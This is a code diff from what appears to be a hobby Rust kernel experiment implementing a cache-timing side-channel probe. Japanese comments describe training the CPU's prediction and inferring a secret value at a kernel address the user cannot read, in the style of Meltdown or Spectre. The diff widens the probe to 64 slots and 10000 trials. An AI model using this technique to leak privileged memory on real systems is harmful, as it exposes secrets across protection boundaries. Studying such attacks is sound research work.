@@ -4,7 +4,7 @@ use x86;
 
 use crate::serial_print;
 #[allow(unused_imports)]
-use crate::{println, serial_println};
+use crate::{println,print, serial_println};
 
 const PAGE_SIZE: usize = 4096;
 
@@ -48,10 +48,10 @@ unsafe fn guess_bit_once(seed: u8, buffer: *mut u8) -> u8 {
     // 飛び先のアドレスで予測されている（CPUは）
     // それを参考にしてトレーニングを施してみる（アドレスの一部を使っている）
 
-    let p = 0xfc0000000 as *mut u8;
+    let p = 0x80000000 as *mut u64;
     //buffer.add(1).write_volatile(1);
     buffer.add(
-        (*p as usize) >> seed & 1  + 1* PAGE_SIZE
+        (*p as usize + 1) * PAGE_SIZE
     ).write_volatile(1);
     // カーネルへのアクセス
 
@@ -60,10 +60,10 @@ unsafe fn guess_bit_once(seed: u8, buffer: *mut u8) -> u8 {
     }*/
 
     // ここに飛びたい
-    (0..2)
+    (0..64)
         .min_by_key(|i| {
-            let time = probe(buffer.add(i + 1 * PAGE_SIZE));
-            serial_println!("{}: {}", i, time);
+            let time = probe(buffer.add((i + 1 )* PAGE_SIZE));
+            //serial_println!("{}: {}", i, time);
             time
         })
         .unwrap() as u8
@@ -82,8 +82,8 @@ fn calc_access_time<F: Fn()>(f: F) -> u64 {
 
 #[inline(never)]
 unsafe fn guess_bit(seed: u8, buffer: *mut u8) -> u8 {
-    const TRY_COUNT: usize = 100;
-    let mut hit_counts = [0; 2];
+    const TRY_COUNT: usize = 10000;
+    let mut hit_counts = [0; 64];
 
     for _ in 0..TRY_COUNT {
         hit_counts[guess_bit_once(seed, buffer) as usize] += 1;
@@ -93,7 +93,7 @@ unsafe fn guess_bit(seed: u8, buffer: *mut u8) -> u8 {
         .iter()
         .enumerate()
         .max_by_key(|(i, &count)| {
-            serial_print!("{}: {:10} ", i, count);
+            serial_println!("{}: {:10} ", i, count);
             count
         })
         .unwrap()
@@ -108,14 +108,16 @@ pub extern "C" fn cache(sample: u8) {
     // 権限が切り替わったらいいね
     // 最終的には、秘密の値のあるアドレスを渡して（そのアドレスはユーザから読めないようにする）推測できればOK
     let mut buffer = [0u8; PAGE_SIZE * 4];
+    let result = unsafe { guess_bit(sample, buffer.as_mut_ptr()) };
+    serial_println!("result: {:x}", result);
 
-    for i in 0..8 {
+    /*for i in 0..64 {
         unsafe {
             //let result = guess_bit((sample >> i) & 1, buffer.as_mut_ptr());
             //println!("{} {}", (sample >> i) & 1, result);
             let result = guess_bit(i, buffer.as_mut_ptr());
-            println!("{} {}", i, result);
+            print!("{}", result);
         }
-    }
+    }*/
     loop {}
 }
